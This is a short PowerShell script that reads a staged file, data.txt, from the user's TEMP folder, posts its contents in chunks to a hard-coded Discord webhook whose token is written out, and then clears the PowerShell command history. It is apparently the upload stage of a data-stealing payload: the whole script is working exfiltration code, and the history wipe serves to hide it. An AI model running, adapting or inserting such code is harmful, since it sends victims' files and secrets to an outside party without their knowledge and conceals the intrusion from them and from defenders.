# Define the webhook URL
$webhookUrl='https://discord.com/api/webhooks/1297470837779333141/8AHSJu020L0KTuKxTcsMP5gaUQoy8M1IIX_1ts-DAsvj8748RNmEm0N9Xoxk-vy-_Gh-'

# Define the path to the text file using the TEMP environment variable
$filePath = "$env:TEMP\data.txt"

# Check if the file exists
if (Test-Path $filePath) {
    # Read the content of the text file
    $fileContent = Get-Content -Path $filePath -Raw

    # Split the content into chunks of 2000 characters
    $chunkSize = 2000
    $chunks = [System.Collections.Generic.List[string]]::new()

    for ($i = 0; $i -lt $fileContent.Length; $i += $chunkSize) {
        $chunks.Add($fileContent.Substring($i, [math]::Min($chunkSize, $fileContent.Length - $i)))
    }

    # Send each chunk to the Discord webhook
    foreach ($chunk in $chunks) {
        # Create the payload for the webhook
        $payload = @{
            content = $chunk
        } | ConvertTo-Json

        # Try to send the content to the Discord webhook
        try {
            Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json'
            Start-Sleep -Seconds 1  # Optional: Pause briefly to avoid rate limits
        } catch {
            Write-Host "Error sending request: $_"
        }
    }
} else {
    Write-Host "File not found: $filePath"
}


# Clear the PowerShell command history
Clear-History
